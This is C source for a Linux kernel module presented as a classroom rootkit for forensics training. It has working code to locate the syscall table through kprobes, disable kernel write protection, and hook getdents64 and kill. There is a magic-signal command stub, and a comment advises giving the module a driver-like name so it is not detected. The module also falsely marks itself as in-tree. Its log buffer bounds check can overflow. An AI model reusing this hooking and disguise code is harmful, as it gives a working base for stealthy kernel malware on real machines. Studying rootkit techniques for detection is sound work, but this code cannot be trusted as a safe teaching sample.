#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <asm/paravirt.h>

// This is an example rootkit to be used in class.
// In use, ensure it is called pci_gateway_driver to avoid being obvious and easily detected.
// Validate that it works before use.

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

// Function pointers for system calls we'll be hooking
unsigned long *__sys_call_table;
asmlinkage long (*original_getdents64)(const struct pt_regs *);
asmlinkage long (*original_kill)(const struct pt_regs *);

// Module parameters for educational purposes
static char *hide_process = "pci_gateway_driver";
module_param(hide_process, charp, 0644);
MODULE_PARM_DESC(hide_process, "Process name to hide (pci_gateway_driver)");

static char *magic_string = "forensics_key";
module_param(magic_string, charp, 0644);
MODULE_PARM_DESC(magic_string, "Magic string for detection (pci_gateway_driver)");

// Buffer to store our fake log entries
static char *log_buffer;
static int log_buffer_size = 0;

// Prototypes
static unsigned long *get_syscall_table(void);
static inline void write_cr0_forced(unsigned long val);
static inline void unprotect_memory(void);
static inline void protect_memory(void);

// Function to get syscall table address (needed for newer kernels)
static unsigned long *get_syscall_table(void) {
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    int ret;
    
    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_INFO "pci_gateway_driver: register_kprobe failed, returned %d\n", ret);
        return NULL;
    }
    
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    return (unsigned long*)kallsyms_lookup_name("sys_call_table");
#else
    // For older kernels, this approach might work
    return NULL;
#endif
}

// Functions to control memory protection
static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & (~ 0x10000));
}

static inline void protect_memory(void) {
    write_cr0_forced(read_cr0() | (0x10000));
}

// Our hooked getdents64 function - hides files/processes
asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    long ret;
    // Call original function
    ret = original_getdents64(regs);
    
    // In a real rootkit, this would filter results to hide files/processes
    // For educational purposes, we'll just log that it was called
    if (log_buffer_size < 4000) { // Prevent buffer overflow
        log_buffer_size += snprintf(log_buffer + log_buffer_size, 100, 
                                   "getdents64 called, returned %ld\n", ret);
    }
    
    return ret;
}

// Our hooked kill function - can be used for command and control
asmlinkage long hooked_kill(const struct pt_regs *regs) {
    long ret;
    int sig = regs->si;
    pid_t pid = regs->di;
    
    // Call original function
    ret = original_kill(regs);
    
    // Educational example: check for magic signal
    // In real rootkits, this might be used for special commands
    if (sig == 64 && pid == 1337) { // Magic signal and PID
        if (log_buffer_size < 4000) {
            log_buffer_size += snprintf(log_buffer + log_buffer_size, 100,
                                       "Magic kill command received\n");
        }
    }
    
    if (log_buffer_size < 4000) {
        log_buffer_size += snprintf(log_buffer + log_buffer_size, 100,
                                   "kill called (pid=%d, sig=%d), returned %ld\n", 
                                   pid, sig, ret);
    }
    
    return ret;
}

// Proc file operations for forensic analysis
static int proc_log_show(struct seq_file *m, void *v) {
    seq_printf(m, "Educational Rootkit Log (Forensic Analysis Data)\n");
    seq_printf(m, "=============================================\n");
    seq_printf(m, "Hide process name: %s\n", hide_process);
    seq_printf(m, "Magic string: %s\n", magic_string);
    seq_printf(m, "Log entries:\n%s\n", log_buffer);
    seq_printf(m, "=============================================\n");
    seq_printf(m, "This is an educational example for forensics training.\n");
    seq_printf(m, "It demonstrates common rootkit techniques in a safe way.\n");
    return 0;
}

static int proc_log_open(struct inode *inode, struct file *file) {
    return single_open(file, proc_log_show, NULL);
}

static const struct proc_ops proc_log_fops = {
    .proc_open = proc_log_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

static struct proc_dir_entry *proc_entry;

// Module initialization
static int __init educational_rootkit_init(void) {
    printk(KERN_INFO "pci_gateway_driver: Loading module\n");
    
    // Allocate log buffer
    log_buffer = kmalloc(4096, GFP_KERNEL);
    if (!log_buffer) {
        printk(KERN_ERR "pci_gateway_driver: Failed to allocate log buffer\n");
        return -ENOMEM;
    }
    memset(log_buffer, 0, 4096);
    log_buffer_size = snprintf(log_buffer, 100, "Module loaded at %lld\n", ktime_get_real_seconds());
    
    // Create proc entry for forensic analysis
    proc_entry = proc_create("rootkit_forensics", 0444, NULL, &proc_log_fops);
    if (!proc_entry) {
        printk(KERN_ERR "pci_gateway_driver: Failed to create proc entry\n");
        kfree(log_buffer);
        return -ENOMEM;
    }
    
    // Get syscall table
    __sys_call_table = get_syscall_table();
    if (!__sys_call_table) {
        printk(KERN_ERR "pci_gateway_driver: Failed to get syscall table\n");
        remove_proc_entry("rootkit_forensics", NULL);
        kfree(log_buffer);
        return -EFAULT;
    }
    
    printk(KERN_INFO "pci_gateway_driver: syscall table found at %p\n", __sys_call_table);
    
    // Store original syscall functions
    original_getdents64 = (void *)__sys_call_table[__NR_getdents64];
    original_kill = (void *)__sys_call_table[__NR_kill];
    
    // Hook syscalls (educational example only!)
    unprotect_memory();
    __sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
    protect_memory();
    
    printk(KERN_INFO "pci_gateway_driver: Syscalls hooked\n");
    printk(KERN_INFO "pci_gateway_driver: Module loaded successfully\n");
    printk(KERN_INFO "pci_gateway_driver: Check /proc/rootkit_forensics for forensic data\n");
    
    return 0;
}

// Module cleanup
static void __exit educational_rootkit_exit(void) {
    // Restore original syscalls
    if (__sys_call_table) {
        unprotect_memory();
        __sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
        __sys_call_table[__NR_kill] = (unsigned long)original_kill;
        protect_memory();
    }
    
    // Remove proc entry
    if (proc_entry) {
        remove_proc_entry("rootkit_forensics", NULL);
    }
    
    // Free log buffer
    if (log_buffer) {
        kfree(log_buffer);
    }
    
    printk(KERN_INFO "pci_gateway_driver: Module unloaded\n");
}

module_init(educational_rootkit_init);
module_exit(educational_rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Educational Example for Forensics Training");
MODULE_DESCRIPTION("A safe, limited example of rootkit techniques for forensic analysis education");
MODULE_VERSION("1.0");
MODULE_INFO(intree, "Y");